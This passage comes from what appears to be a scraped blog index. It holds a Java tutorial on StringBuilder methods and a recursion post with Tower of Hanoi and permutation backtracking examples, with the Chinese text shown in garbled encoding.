<span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="StringBuilderå¸¸ç”¨çš„æˆå‘˜æ–¹æ³•"><a href="#StringBuilderå¸¸ç”¨çš„æˆå‘˜æ–¹æ³•" class="headerlink" title="StringBuilderå¸¸ç”¨çš„æˆå‘˜æ–¹æ³•"></a>StringBuilderå¸¸ç”¨çš„æˆå‘˜æ–¹æ³•</h4><p><img src="/2022/03/29/java-chang-yong-api/image-20220320163503372.png"></p><p>ä»£ç æ ·ä¾‹ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">StringBuilderDemo01</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">//åˆ›å»ºå¯¹è±¡</span>        <span class="token class-name">StringBuilder</span> sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//public StringBuilder append(ä»»æ„ç±»å‹)ï¼šæ·»åŠ æ•°æ®ï¼Œå¹¶è¿”å›å¯¹è±¡æœ¬èº«</span>        <span class="token comment">//é“¾å¼ç¼–ç¨‹</span>        sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"world"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"sb:"</span> <span class="token operator">+</span> sb<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//public StringBuilder reverse()ï¼šè¿”å›ç›¸åçš„å­—ç¬¦åºåˆ—</span>        sb<span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"sb:"</span> <span class="token operator">+</span> sb<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="StringBuilderå’ŒStringç›¸äº’è½¬æ¢"><a href="#StringBuilderå’ŒStringç›¸äº’è½¬æ¢" class="headerlink" title="StringBuilderå’ŒStringç›¸äº’è½¬æ¢"></a>StringBuilderå’ŒStringç›¸äº’è½¬æ¢</h4><ul><li><p><strong>StringBuilderè½¬æ¢ä¸ºString</strong></p><p>â€‹        public String toString()ï¼šé€šè¿‡ toString() å°±å¯ä»¥å®ç°æŠŠ StringBuilder è½¬æ¢ä¸º String</p></li><li><p><strong>Stringè½¬æ¢ä¸ºStringBuilder</strong></p><p>â€‹        public StringBuilder(String s)ï¼šé€šè¿‡æ„é€ æ–¹æ³•å°±å¯ä»¥å®ç°æŠŠ String è½¬æ¢ä¸º StringBuilder</p></li></ul><h4 id="StringBuilderæ‹¼æ¥å­—ç¬¦ä¸²æ¡ˆä¾‹"><a href="#StringBuilderæ‹¼æ¥å­—ç¬¦ä¸²æ¡ˆä¾‹" class="headerlink" title="StringBuilderæ‹¼æ¥å­—ç¬¦ä¸²æ¡ˆä¾‹"></a>StringBuilderæ‹¼æ¥å­—ç¬¦ä¸²æ¡ˆä¾‹</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">StringBuilderTest01</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">//å®šä¹‰ä¸€ä¸ª int ç±»å‹çš„æ•°ç»„ï¼Œç”¨é™æ€åˆå§‹åŒ–å®Œæˆæ•°ç»„å…ƒç´ çš„åˆå§‹åŒ–</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token comment">//è°ƒç”¨æ–¹æ³•ï¼Œç”¨ä¸€ä¸ªå˜é‡æ¥æ”¶ç»“æœ</span>        <span class="token class-name">String</span> s <span class="token operator">=</span> <span class="token function">arrayToString</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//è¾“å‡ºç»“æœ</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"s:"</span> <span class="token operator">+</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">arrayToString</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">//åœ¨æ–¹æ³•ä¸­ç”¨ StringBuilder æŒ‰ç…§è¦æ±‚è¿›è¡Œæ‹¼æ¥ï¼Œå¹¶æŠŠç»“æœè½¬æˆ String è¿”å›</span>        <span class="token class-name">StringBuilder</span> sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"["</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">==</span> arr<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">", "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> s <span class="token operator">=</span> sb<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span>  s<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> JavaSE </tag>
            
            <tag> JavaåŸºç¡€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é€’å½’ç®—æ³•ï¼ˆä¸€ï¼‰</title>
      <link href="/2022/03/28/di-gui-suan-fa-yi/"/>
      <url>/2022/03/28/di-gui-suan-fa-yi/</url>
      
        <content type="html"><![CDATA[<h2 id="ä»€ä¹ˆæ˜¯é€’å½’"><a href="#ä»€ä¹ˆæ˜¯é€’å½’" class="headerlink" title="ä»€ä¹ˆæ˜¯é€’å½’"></a>ä»€ä¹ˆæ˜¯é€’å½’</h2><p>åœ¨å‡½æ•°ä¸­å­˜åœ¨ç€è°ƒç”¨å‡½æ•°æœ¬èº«çš„æƒ…å†µï¼Œè¿™ç§ç°è±¡å°±å«é€’å½’ã€‚é€’å½’å’Œæ ˆæœ‰ç´§å¯†å…³è”ã€‚æˆ‘ä»¬å¯ä»¥å°†é€’å½’çœ‹åšä¸€æ¬¡æ¬¡å…¥æ ˆå‡ºæ ˆçš„è¿‡ç¨‹ã€‚</p><p><strong>ç‰¹ç‚¹</strong>ï¼š</p><blockquote><ul><li>é€’å½’å°±æ˜¯æ–¹æ³•é‡Œè°ƒç”¨è‡ªèº«ã€‚</li><li>åœ¨ä½¿ç”¨é€’å¢å½’ç­–ç•¥æ—¶ï¼Œå¿…é¡»æœ‰ä¸€ä¸ª<strong>æ˜ç¡®çš„é€’å½’ç»“æŸæ¡ä»¶</strong>ï¼Œç§°ä¸ºé€’å½’å‡ºå£ã€‚</li><li>é€’å½’ç®—æ³•è§£é¢˜é€šå¸¸æ˜¾å¾—å¾ˆç®€æ´ï¼Œä½†é€’å½’ç®—æ³•è§£é¢˜çš„è¿è¡Œæ•ˆç‡è¾ƒä½ã€‚æ‰€ä»¥ä¸€èˆ¬ä¸æå€¡ç”¨é€’å½’ç®—æ³•è®¾è®¡ç¨‹åºã€‚</li><li>åœ¨é€’å½’è°ƒç”¨çš„è¿‡ç¨‹å½“ä¸­ç³»ç»Ÿä¸ºæ¯ä¸€å±‚çš„è¿”å›ç‚¹ã€å±€éƒ¨é‡ç­‰å¼€è¾Ÿäº†æ ˆæ¥å­˜å‚¨ã€‚é€’å½’æ¬¡æ•°è¿‡å¤šå®¹æ˜“é€ æˆæ ˆæº¢å‡ºç­‰ï¼Œæ‰€ä»¥ä¸€èˆ¬ä¸æå€¡ç”¨é€’å½’ç®—æ³•è®¾è®¡ç¨‹åºã€‚</li></ul></blockquote><h4 id="æ±‰è¯ºå¡”é—®é¢˜"><a href="#æ±‰è¯ºå¡”é—®é¢˜" class="headerlink" title="æ±‰è¯ºå¡”é—®é¢˜"></a>æ±‰è¯ºå¡”é—®é¢˜</h4><p><img src="/2022/03/28/di-gui-suan-fa-yi/image-20220329195725262.png"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">hanoi</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">,</span><span class="token keyword">int</span> p1<span class="token punctuation">,</span><span class="token keyword">int</span> p2<span class="token punctuation">,</span><span class="token keyword">int</span> p3<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">==</span>n<span class="token punctuation">)</span>cout<span class="token operator">&lt;&lt;</span><span class="token string">"ç›˜å­ä»"</span><span class="token operator">&lt;&lt;</span>p1<span class="token operator">&lt;&lt;</span><span class="token string">"ç§»åˆ°"</span><span class="token operator">&lt;&lt;</span>p3<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token function">hanoi</span><span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>p1<span class="token punctuation">,</span>p3<span class="token punctuation">,</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>cout<span class="token operator">&lt;&lt;</span><span class="token string">"ç›˜å­ä»"</span><span class="token operator">&lt;&lt;</span>p1<span class="token operator">&lt;&lt;</span><span class="token string">"ç§»åˆ°"</span><span class="token operator">&lt;&lt;</span>p3<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span><span class="token function">hanoi</span><span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>p2<span class="token punctuation">,</span>p1<span class="token punctuation">,</span>p3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å•ä¸€çš„é€’å½’ç”¨çš„å¾ˆå°‘ï¼Œæ›´å¤šçš„æ˜¯ä¸ä¸€äº›å…¶ä»–ç®—æ³•æ€æƒ³ç»“åˆåœ¨ä¸€èµ·</p><h2 id="é€’å½’å’Œå›æº¯"><a href="#é€’å½’å’Œå›æº¯" class="headerlink" title="é€’å½’å’Œå›æº¯"></a>é€’å½’å’Œå›æº¯</h2><h4 id="å›æº¯ï¼š"><a href="#å›æº¯ï¼š" class="headerlink" title="å›æº¯ï¼š"></a>å›æº¯ï¼š</h4><blockquote><p>æŠŠé—®é¢˜åˆ†æ­¥è§£å†³ï¼Œåœ¨æ¯ä¸€æ­¥éƒ½è¯•éªŒæ‰€æœ‰çš„å¯èƒ½ï¼Œå½“å‘ç°å·²ç»æ‰¾åˆ°ä¸€ç§æ–¹å¼æˆ–è€…ç›®å‰è¿™ç§æ–¹å¼ä¸å¯èƒ½æ˜¯ç»“æœçš„æ—¶å€™ï¼Œé€€å›ä¸Šä¸€æ­¥ç»§ç»­å°è¯•å…¶ä»–å¯èƒ½ã€‚</p><p>å½“å›æº¯ç”¨äºæ ‘çš„æ—¶å€™ï¼Œå°±æ˜¯æ·±åº¦ä¼˜å…ˆæœç´¢ã€‚å½“ç„¶äº†ï¼Œå‡ ä¹æ‰€æœ‰å¯ä»¥ç”¨å›æº¯è§£å†³çš„é—®é¢˜éƒ½å¯ä»¥è¡¨ç¤ºä¸ºæ ‘ã€‚</p><p>é€’å½’æ˜¯ä¸€ç§ç®—æ³•ç»“æ„ï¼Œè€Œå›æº¯åŒ…æ‹¬åé¢çš„å‰ªææ˜¯ä¸€ç§ç®—æ³•æ€æƒ³ã€‚</p></blockquote><h3 id="å…¨æ’åˆ—é—®é¢˜"><a href="#å…¨æ’åˆ—é—®é¢˜" class="headerlink" title="å…¨æ’åˆ—é—®é¢˜"></a>å…¨æ’åˆ—é—®é¢˜</h3><p>æŠŠ $1 \sim n$ è¿™ $n$ ä¸ªæ•´æ•°æ’æˆä¸€è¡Œåéšæœºæ‰“ä¹±é¡ºåºï¼Œè¾“å‡ºæ‰€æœ‰å¯èƒ½çš„æ¬¡åºã€‚</p><h4 id="è¾“å…¥æ ¼å¼"><a href="#è¾“å…¥æ ¼å¼" class="headerlink" title="è¾“å…¥æ ¼å¼"></a>è¾“å…¥æ ¼å¼</h4><p>ä¸€ä¸ªæ•´æ•° $n$ã€‚</p><h4 id="è¾“å‡ºæ ¼å¼"><a href="#è¾“å‡ºæ ¼å¼" class="headerlink" title="è¾“å‡ºæ ¼å¼"></a>è¾“å‡ºæ ¼å¼</h4><p>æŒ‰ç…§ä»å°åˆ°å¤§çš„é¡ºåºè¾“å‡ºæ‰€æœ‰æ–¹æ¡ˆï¼Œæ¯è¡Œ $1$ ä¸ªã€‚</p><p>é¦–å…ˆï¼ŒåŒä¸€è¡Œç›¸é‚»ä¸¤ä¸ªæ•°ç”¨ä¸€ä¸ªç©ºæ ¼éš”å¼€ã€‚</p><p>å…¶æ¬¡ï¼Œå¯¹äºä¸¤ä¸ªä¸åŒçš„è¡Œï¼Œå¯¹åº”ä¸‹æ ‡çš„æ•°ä¸€ä¸€æ¯”è¾ƒï¼Œå­—å…¸åºè¾ƒå°çš„æ’åœ¨å‰é¢ã€‚</p><h4 id="æ•°æ®èŒƒå›´"><a href="#æ•°æ®èŒƒå›´" class="headerlink" title="æ•°æ®èŒƒå›´"></a>æ•°æ®èŒƒå›´</h4><p>$1 \le n \le 9$</p><h4 id="è¾“å…¥æ ·ä¾‹ï¼š"><a href="#è¾“å…¥æ ·ä¾‹ï¼š" class="headerlink" title="è¾“å…¥æ ·ä¾‹ï¼š"></a>è¾“å…¥æ ·ä¾‹ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="è¾“å‡ºæ ·ä¾‹ï¼š"><a href="#è¾“å‡ºæ ·ä¾‹ï¼š" class="headerlink" title="è¾“å‡ºæ ·ä¾‹ï¼š"></a>è¾“å‡ºæ ·ä¾‹ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">1 2 31 3 22 1 32 3 13 1 23 2 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="é¢˜è§£ï¼š"><a href="#é¢˜è§£ï¼š" class="headerlink" title="é¢˜è§£ï¼š"></a>é¢˜è§£ï¼š</h4><p>ååˆ†ç»å…¸çš„dfsï¼Œé€‰ä¸ä¸é€‰çš„é¢˜ã€‚</p><p>çœ‹ä¸€ä¸‹é€’å½’æ ‘</p><p><img src="/2022/03/28/di-gui-suan-fa-yi/55289_0cd4222d73-%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E9%81%8D%E5%8E%86.png"></p><blockquote><p>å‡è®¾æœ‰ 3 ä¸ªç©ºä½ï¼Œä»å‰å¾€åå¡«æ•°å­—ï¼Œæ¯æ¬¡å¡«ä¸€ä¸ªä½ç½®ï¼Œå¡«çš„æ•°å­—ä¸èƒ½å’Œå‰é¢ä¸€æ ·ã€‚</p><p>æœ€å¼€å§‹çš„æ—¶å€™ï¼Œä¸‰ä¸ªç©ºä½éƒ½æ˜¯ç©ºçš„ï¼š__ __ __</p><p>é¦–å…ˆå¡«å†™ç¬¬ä¸€ä¸ªç©ºä½ï¼Œç¬¬ä¸€ä¸ªç©ºä½å¯ä»¥å¡« 1ï¼Œå¡«å†™åä¸ºï¼š1 __ __</p><p>å¡«å¥½ç¬¬ä¸€ä¸ªç©ºä½ï¼Œå¡«ç¬¬äºŒä¸ªç©ºä½ï¼Œç¬¬äºŒä¸ªç©ºä½å¯ä»¥å¡« 2ï¼Œå¡«å†™åä¸ºï¼š1 2 __</p><p>å¡«å¥½ç¬¬äºŒä¸ªç©ºä½ï¼Œå¡«ç¬¬ä¸‰ä¸ªç©ºä½ï¼Œç¬¬ä¸‰ä¸ªç©ºä½å¯ä»¥å¡« 3ï¼Œå¡«å†™åä¸ºï¼š 1 2 3</p><p>è¿™æ—¶å€™ï¼Œç©ºä½å¡«å®Œï¼Œæ— æ³•ç»§ç»­å¡«æ•°ï¼Œæ‰€ä»¥è¿™æ˜¯ä¸€ç§æ–¹æ¡ˆï¼Œè¾“å‡ºã€‚</p><p>ç„¶åå¾€åé€€ä¸€æ­¥ï¼Œé€€åˆ°äº†çŠ¶æ€ï¼š1 2 __ ã€‚å‰©ä½™ç¬¬ä¸‰ä¸ªç©ºä½æ²¡æœ‰å¡«æ•°ã€‚ç¬¬ä¸‰ä¸ªç©ºä½ä¸Šé™¤äº†å¡«è¿‡çš„ 3 ï¼Œæ²¡æœ‰å…¶ä»–æ•°å­—å¯ä»¥å¡«ã€‚</p><p>å› æ­¤å†å¾€åé€€ä¸€æ­¥ï¼Œé€€åˆ°äº†çŠ¶æ€ï¼š1 __ __ã€‚ç¬¬äºŒä¸ªç©ºä½ä¸Šé™¤äº†å¡«è¿‡çš„ 2ï¼Œè¿˜å¯ä»¥å¡« 3ã€‚ç¬¬äºŒä¸ªç©ºä½ä¸Šå¡«å†™ 3ï¼Œå¡«å†™åä¸ºï¼š1 3 __</p><p>å¡«å¥½ç¬¬äºŒä¸ªç©ºä½ï¼Œå¡«ç¬¬ä¸‰ä¸ªç©ºä½ï¼Œç¬¬ä¸‰ä¸ªç©ºä½å¯ä»¥å¡« 2ï¼Œå¡«å†™åä¸ºï¼š 1 3 2</p><p>è¿™æ—¶å€™ï¼Œç©ºä½å¡«å®Œï¼Œæ— æ³•ç»§ç»­å¡«æ•°ï¼Œæ‰€ä»¥è¿™æ˜¯ä¸€ç§æ–¹æ¡ˆï¼Œè¾“å‡ºã€‚</p><p>ç„¶åå¾€åé€€ä¸€æ­¥ï¼Œé€€åˆ°äº†çŠ¶æ€ï¼š1 3 __ ã€‚å‰©ä½™ç¬¬ä¸‰ä¸ªç©ºä½æ²¡æœ‰å¡«æ•°ã€‚ç¬¬ä¸‰ä¸ªç©ºä½ä¸Šé™¤äº†å¡«è¿‡çš„ 2ï¼Œæ²¡æœ‰å…¶ä»–æ•°å­—å¯ä»¥å¡«ã€‚</p><p>å› æ­¤å†å¾€åé€€ä¸€æ­¥ï¼Œé€€åˆ°äº†çŠ¶æ€ï¼š1 __ __ã€‚ç¬¬äºŒä¸ªç©ºä½ä¸Šé™¤äº†å¡«è¿‡çš„ 2ï¼Œ3ï¼Œæ²¡æœ‰å…¶ä»–æ•°å­—å¯ä»¥å¡«ã€‚</p><p>å› æ­¤å†å¾€åé€€ä¸€æ­¥ï¼Œé€€åˆ°äº†çŠ¶æ€ï¼š__ __ __ã€‚ç¬¬ä¸€ä¸ªç©ºä½ä¸Šé™¤äº†å¡«è¿‡çš„ 1ï¼Œè¿˜å¯ä»¥å¡« 2ã€‚ç¬¬ä¸€ä¸ªç©ºä½ä¸Šå¡«å†™ 2ï¼Œå¡«å†™åä¸ºï¼š2 __ __</p><p>å¡«å¥½ç¬¬ä¸€ä¸ªç©ºä½ï¼Œå¡«ç¬¬äºŒä¸ªç©ºä½ï¼Œç¬¬äºŒä¸ªç©ºä½å¯ä»¥å¡« 1ï¼Œå¡«å†™åä¸ºï¼š2 1 __</p><p>å¡«å¥½ç¬¬äºŒä¸ªç©ºä½ï¼Œå¡«ç¬¬ä¸‰ä¸ªç©ºä½ï¼Œç¬¬ä¸‰ä¸ªç©ºä½å¯ä»¥å¡« 3ï¼Œå¡«å†™åä¸ºï¼š2 1 3</p><p>è¿™æ—¶å€™ï¼Œç©ºä½å¡«å®Œï¼Œæ— æ³•ç»§ç»­å¡«æ•°ï¼Œæ‰€ä»¥è¿™æ˜¯ä¸€ç§æ–¹æ¡ˆï¼Œè¾“å‡ºã€‚</p><p>ç„¶åå¾€åé€€ä¸€æ­¥ï¼Œé€€åˆ°äº†çŠ¶æ€ï¼š2 1 __ ã€‚å‰©ä½™ç¬¬ä¸‰ä¸ªç©ºä½æ²¡æœ‰å¡«æ•°ã€‚ç¬¬ä¸‰ä¸ªç©ºä½ä¸Šé™¤äº†å¡«è¿‡çš„ 3ï¼Œæ²¡æœ‰å…¶ä»–æ•°å­—å¯ä»¥å¡«ã€‚</p><p>å› æ­¤å†å¾€åé€€ä¸€æ­¥ï¼Œé€€åˆ°äº†çŠ¶æ€ï¼š2 __ __ã€‚ç¬¬äºŒä¸ªç©ºä½ä¸Šé™¤äº†å¡«è¿‡çš„ 1ï¼Œè¿˜å¯ä»¥å¡« 3ã€‚ç¬¬äºŒä¸ªç©ºä½ä¸Šå¡«å†™ 3ï¼Œå¡«å†™åä¸ºï¼š2 3 __</p><p>å¡«å¥½ç¬¬äºŒä¸ªç©ºä½ï¼Œå¡«ç¬¬ä¸‰ä¸ªç©ºä½ï¼Œç¬¬ä¸‰ä¸ªç©ºä½å¯ä»¥å¡« 1ï¼Œå¡«å†™åä¸ºï¼š2 3 1</p><p>è¿™æ—¶å€™ï¼Œç©ºä½å¡«å®Œï¼Œæ— æ³•ç»§ç»­å¡«æ•°ï¼Œæ‰€ä»¥è¿™æ˜¯ä¸€ç§æ–¹æ¡ˆï¼Œè¾“å‡ºã€‚</p><p>ç„¶åå¾€åé€€ä¸€æ­¥ï¼Œé€€åˆ°äº†çŠ¶æ€ï¼š2 3 __ ã€‚å‰©ä½™ç¬¬ä¸‰ä¸ªç©ºä½æ²¡æœ‰å¡«æ•°ã€‚ç¬¬ä¸‰ä¸ªç©ºä½ä¸Šé™¤äº†å¡«è¿‡çš„ 1ï¼Œæ²¡æœ‰å…¶ä»–æ•°å­—å¯ä»¥å¡«ã€‚</p><p>å› æ­¤å†å¾€åé€€ä¸€æ­¥ï¼Œé€€åˆ°äº†çŠ¶æ€ï¼š2 __ __ã€‚ç¬¬äºŒä¸ªç©ºä½ä¸Šé™¤äº†å¡«è¿‡çš„ 1ï¼Œ3ï¼Œæ²¡æœ‰å…¶ä»–æ•°å­—å¯ä»¥å¡«ã€‚</p><p>å› æ­¤å†å¾€åé€€ä¸€æ­¥ï¼Œé€€åˆ°äº†çŠ¶æ€ï¼š__ __ __ã€‚ç¬¬ä¸€ä¸ªç©ºä½ä¸Šé™¤äº†å¡«è¿‡çš„ 1ï¼Œ2ï¼Œè¿˜å¯ä»¥å¡« 3ã€‚ç¬¬ä¸€ä¸ªç©ºä½ä¸Šå¡«å†™ 3ï¼Œå¡«å†™åä¸ºï¼š3 __ __</p><p>å¡«å¥½ç¬¬ä¸€ä¸ªç©ºä½ï¼Œå¡«ç¬¬äºŒä¸ªç©ºä½ï¼Œç¬¬äºŒä¸ªç©ºä½å¯ä»¥å¡« 1ï¼Œå¡«å†™åä¸ºï¼š3 1 __</p><p>å¡«å¥½ç¬¬äºŒä¸ªç©ºä½ï¼Œå¡«ç¬¬ä¸‰ä¸ªç©ºä½ï¼Œç¬¬ä¸‰ä¸ªç©ºä½å¯ä»¥å¡« 2ï¼Œå¡«å†™åä¸ºï¼š3 1 2</p><p>è¿™æ—¶å€™ï¼Œç©ºä½å¡«å®Œï¼Œæ— æ³•ç»§ç»­å¡«æ•°ï¼Œæ‰€ä»¥è¿™æ˜¯ä¸€ç§æ–¹æ¡ˆï¼Œè¾“å‡ºã€‚</p><p>ç„¶åå¾€åé€€ä¸€æ­¥ï¼Œé€€åˆ°äº†çŠ¶æ€ï¼š3 1 __ ã€‚å‰©ä½™ç¬¬ä¸‰ä¸ªç©ºä½æ²¡æœ‰å¡«æ•°ã€‚ç¬¬ä¸‰ä¸ªç©ºä½ä¸Šé™¤äº†å¡«è¿‡çš„ 2ï¼Œæ²¡æœ‰å…¶ä»–æ•°å­—å¯ä»¥å¡«ã€‚</p><p>å› æ­¤å†å¾€åé€€ä¸€æ­¥ï¼Œé€€åˆ°äº†çŠ¶æ€ï¼š3 __ __ã€‚ç¬¬äºŒä¸ªç©ºä½ä¸Šé™¤äº†å¡«è¿‡çš„ 1ï¼Œè¿˜å¯ä»¥å¡« 2ã€‚ç¬¬äºŒä¸ªç©ºä½ä¸Šå¡«å†™ 2ï¼Œå¡«å†™åä¸ºï¼š3 2 __</p><p>å¡«å¥½ç¬¬äºŒä¸ªç©ºä½ï¼Œå¡«ç¬¬ä¸‰ä¸ªç©ºä½ï¼Œç¬¬ä¸‰ä¸ªç©ºä½å¯ä»¥å¡« 1ï¼Œå¡«å†™åä¸ºï¼š3 2 1</p><p>è¿™æ—¶å€™ï¼Œç©ºä½å¡«å®Œï¼Œæ— æ³•ç»§ç»­å¡«æ•°ï¼Œæ‰€ä»¥è¿™æ˜¯ä¸€ç§æ–¹æ¡ˆï¼Œè¾“å‡ºã€‚</p><p>ç„¶åå¾€åé€€ä¸€æ­¥ï¼Œé€€åˆ°äº†çŠ¶æ€ï¼š3 2 __ ã€‚å‰©ä½™ç¬¬ä¸‰ä¸ªç©ºä½æ²¡æœ‰å¡«æ•°ã€‚ç¬¬ä¸‰ä¸ªç©ºä½ä¸Šé™¤äº†å¡«è¿‡çš„ 1ï¼Œ2ï¼Œæ²¡æœ‰å…¶ä»–æ•°å­—å¯ä»¥å¡«ã€‚</p><p>å› æ­¤å†å¾€åé€€ä¸€æ­¥ï¼Œé€€åˆ°äº†çŠ¶æ€ï¼š3 __ __ã€‚ç¬¬äºŒä¸ªç©ºä½ä¸Šé™¤äº†å¡«è¿‡çš„ 1ï¼Œ2ï¼Œæ²¡æœ‰å…¶ä»–æ•°å­—å¯ä»¥å¡«ã€‚</p><p>å› æ­¤å†å¾€åé€€ä¸€æ­¥ï¼Œé€€åˆ°äº†çŠ¶æ€ï¼š__ __ __ã€‚ç¬¬ä¸€ä¸ªç©ºä½ä¸Šé™¤äº†å¡«è¿‡çš„ 1ï¼Œ2ï¼Œ3ï¼Œæ²¡æœ‰å…¶ä»–æ•°å­—å¯ä»¥å¡«ã€‚</p><p>æ­¤æ—¶æ·±åº¦ä¼˜å…ˆæœç´¢ç»“æŸï¼Œè¾“å‡ºäº†æ‰€æœ‰çš„æ–¹æ¡ˆã€‚</p></blockquote><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream&gt;</span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> N <span class="token operator">=</span> <span class="token number">10</span><span class="token 